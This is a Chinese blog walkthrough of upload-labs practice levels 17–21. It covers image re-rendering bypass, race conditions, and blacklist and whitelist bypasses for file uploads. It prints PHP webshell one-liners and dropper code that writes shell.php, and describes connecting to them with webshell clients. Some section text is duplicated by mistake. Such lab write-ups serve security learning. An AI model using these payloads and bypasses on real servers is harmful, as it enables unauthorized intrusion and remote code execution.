# 原创
：  【upload靶场17-21】二次渲染、条件竞争、黑白名单绕过

# 【upload靶场17-21】二次渲染、条件竞争、黑白名单绕过

**目录**

[一、推荐](#%E4%B8%80%E3%80%81%E6%8E%A8%E8%8D%90)

[Pass17（二次渲染绕过）](#Pass10%EF%BC%88%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99%E7%9A%84%E4%B8%80%E6%AC%A1%E6%80%A7%EF%BC%8C%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%89)

[特点：](#%E7%89%B9%E7%82%B9%EF%BC%9A)

[分析：](#%E5%88%86%E6%9E%90%EF%BC%9A)

[利用：](#%E5%88%A9%E7%94%A8%EF%BC%9A)

[Pass18（条件竞争）](#Pass10%EF%BC%88%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99%E7%9A%84%E4%B8%80%E6%AC%A1%E6%80%A7%EF%BC%8C%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%89)

[特点：](#%E7%89%B9%E7%82%B9%EF%BC%9A)

[分析：](#%E5%88%86%E6%9E%90%EF%BC%9A)

[利用：](#%E5%88%A9%E7%94%A8%EF%BC%9A)

[Pass19（条件竞争）](#Pass10%EF%BC%88%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99%E7%9A%84%E4%B8%80%E6%AC%A1%E6%80%A7%EF%BC%8C%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%89)

[特点：](#%E7%89%B9%E7%82%B9%EF%BC%9A)

[分析：](#%E5%88%86%E6%9E%90%EF%BC%9A)

[利用：](#%E5%88%A9%E7%94%A8%EF%BC%9A)

[Pass20（黑名单检测）](#Pass10%EF%BC%88%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99%E7%9A%84%E4%B8%80%E6%AC%A1%E6%80%A7%EF%BC%8C%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%89)

[特点：](#%E7%89%B9%E7%82%B9%EF%BC%9A)

[分析：](#%E5%88%86%E6%9E%90%EF%BC%9A)

[利用：](#%E5%88%A9%E7%94%A8%EF%BC%9A)

[Pass21（绕过白名单）](#Pass10%EF%BC%88%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99%E7%9A%84%E4%B8%80%E6%AC%A1%E6%80%A7%EF%BC%8C%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%89)

[特点：](#%E7%89%B9%E7%82%B9%EF%BC%9A)

[分析：](#%E5%88%86%E6%9E%90%EF%BC%9A)

[利用：](#%E5%88%A9%E7%94%A8%EF%BC%9A)

---


> 
<h2>一、推荐</h2>
[【upload靶场1-11】基础关卡：特点、分析、利用<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125846616?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125846616?spm=1001.2014.3001.5501)[【upload靶场12-16】截断、图片马<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125870738?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125870738?spm=1001.2014.3001.5501)


---


---


## Pass17（二次渲染绕过）

> 
<h3>特点：</h3>
二次渲染：后端对文件的内容进行重写


> 
<h3>分析：</h3>
后面关卡应该基本上是后端检查
<hr/>
考虑：
通过对比渲染前后的图片，寻找未被渲染的地方，并在其中插入语句


> 
<h3>利用：</h3>
上传正常图片
并下载经过上传渲染后的图片
然后使用工具进行比较

 

 
 分析前后未被渲染的地方<img alt="" height="712" src="https://img-blog.csdnimg.cn/84497cba5669404094e43d07f0d894c3.png" width="1027"/>
 

<hr/>

制作图片马
可以直接使用Hex软件（如010 Editor、winhex等）在未被渲染的位置写入代码
（不能损坏文件，不然可能会被检测为非图片格式）
（是替换原位置代码，且原位置代码无伤大雅）


<hr/>
 上传 图片马




<hr/>
 打开图片获得图片地址
利用文件包含漏洞upload-labs/include.php?file=upload/文件名
（图片显示为乱码则解析成功了）
复制图片马的地址
蚁剑（菜刀、冰蝎）连接
粘贴shell地址，和自己设置的密码


---


---


---


## Pass18（条件竞争）

> 
<h3>特点：</h3>
二次渲染：后端对文件的内容进行重写


> 
<h3>分析：</h3>
后面关卡应该基本上是后端检查
<hr/>
考虑：
通过对比渲染前后的图片，寻找未被渲染的地方，并在其中插入语句

<img alt="" height="272" src="https://img-blog.csdnimg.cn/5789579100864422847a6849d3dd33c8.png" width="504"/> 

 
逻辑顺序
1、服务器先是将上传的文件保存
2、再将文件的后缀名同白名单对比，符合则进行重命名
3、不符合，unlink()函数删除该文件 
<hr/>
保存到删除之间，会有一段时间差
在这段时间内，文件是在服务器上的，可能被执行


---


> 
<h3>利用：</h3>
准备php文件
触发其写一个shell.php命名的webshell
&lt;?php file_put_contents('shell.php','&lt;?php @assert($_POST[pass18]);?&gt;'); ?&gt;

 或者
&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST["Tony"])?&gt;');?&gt;

<hr/>
 
上传php文件



使用bp拦截，并发送到intruder
<img alt="" height="636" src="https://img-blog.csdnimg.cn/2f2cabdf0ab2497f8ceaacd21fb4b9db.png" width="904"/> 清除有效载荷位置

 
设置无载荷，无期限重复<img alt="" height="619" src="https://img-blog.csdnimg.cn/79dd734c5260440784cd3db1defc89e6.png" width="1002"/>
 并设置一下线程-----&gt;开始

<hr/>
与此同时运行python脚本，用来不断访问php文件，使其解析成功

<hr/>
打开文件获得上传文件的地址
相应知道了生成文件的地址
蚁剑（菜刀、冰蝎）连接
粘贴shell地址，和自己设置的密码


---


---


---


## Pass19（条件竞争）

> 
<h3>特点：</h3>
检测然后重命名


> 
<h3>分析：</h3>
后面关卡应该基本上是后端检查


<hr/>
 <img alt="" height="874" src="https://img-blog.csdnimg.cn/e054c4c5a86a4be5a0b96291310838d6.png" width="1200"/>
 



逻辑顺序
1、服务器先将文件与白名单作对比
2、检查大小看文件是否已经存在
3、再进行重命名
<hr/>
保存到重命名之间，会有一段时间差
在这段时间内，文件还是能被访问到的，并被解析执行


---


> 
<h3>利用：</h3>
准备图片马
触发其写一个shell.php命名的webshell
&lt;?php file_put_contents('shell.php','&lt;?php @assert($_POST['123']);?&gt;'); ?&gt;

或者
&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST['123'])?&gt;');?&gt;

<hr/>

使用bp拦截，并发送到intruder
<img alt="" height="636" src="https://img-blog.csdnimg.cn/2f2cabdf0ab2497f8ceaacd21fb4b9db.png" width="904"/> 清除有效载荷位置


设置无载荷，无期限重复<img alt="" height="619" src="https://img-blog.csdnimg.cn/79dd734c5260440784cd3db1defc89e6.png" width="1002"/>
 并设置一下线程-----&gt;开始

<hr/>
与此同时运行python脚本，用来不断访问图片马，使其解析成功
（此时的脚本是文件包含去访问）
<hr/>
打开图片获得上传文件的地址
相应知道了图片马的地址
蚁剑（菜刀、冰蝎）连接
粘贴shell地址，和自己设置的密码


---


---


---


## Pass20（黑名单检测）

> 
<h3>特点：</h3>
会对用户输入的保存文件名。进行黑名单检测
move_uploaded_file()函数检测


> 
<h3>分析：</h3>
后面关卡应该基本上是后端检查


<hr/>
 对上传的文件，没有任何检测
但是会对其保存的文件名进行检测
考虑：
1、对文件名后缀进行爆破（绕过黑名单）
2、将save_name参数进行%00截断
3、bp抓包修改为shell.php/.绕过move_uploaded_file()函数检测


> 
<h3>利用：</h3>
将写入一句话木马的php文件改为png后缀，并上传
&lt;?php @eval($_POST['123']);?&gt;


 

<hr/>

使用bp拦截


 将保存的文件名修改为.php./后缀<img alt="" height="826" src="https://img-blog.csdnimg.cn/5a03777c05ed40fcbce60aa9d3e53ad1.png" width="832"/>

<hr/>
 
打开图片获得上传文件的地址
相应知道了shell文件的地址
蚁剑（菜刀、冰蝎）连接
最后网盘地址为…… upload-20.php/
粘贴shell地址，和自己设置的密码


---


---


---


## Pass21（绕过白名单）

> 
<h3>特点：</h3>



> 
<h3>分析：</h3>
后面关卡应该基本上是后端检查
<hr/>

 
逻辑流程：<br/> MIME检测：content-type值检测（bp抓包修改）<br/> 判空：POST参数是否为空定义$file变量（构造数组绕过分割）<br/> 分割：file不是数组则使用explode('.', strtolower($file))对file进行切割，变为一个数组<br/> 判断后缀：数组后缀是否合法<br/> 命名：数组第一位和$file[count($file) - 1]拼接，文件名file_name<br/> 上传
<hr/>

考虑：
1、修改MIME
2、构造数组
3、构造php文件数组的下一个数组为空，没法拼接文件名


---


> 
<h3>利用：</h3>
上传一句话木马
&lt;?php @eval($_POST['123']);?&gt;
（上传什么后缀都不要紧，因为他后面有重新保存文件名，所以对上传的文件名没有检测）


<hr/>

使用bp拦截

 
1、修改MIME：image/jpeg
2、构造数组：[0][2]
3、构造php文件数组的下一个数组为空，没法拼接文件名

 

 


<hr/>

打开图片获得上传文件的地址
蚁剑（菜刀、冰蝎）连接
最后网盘地址为
粘贴shell地址，和自己设置的密码


---

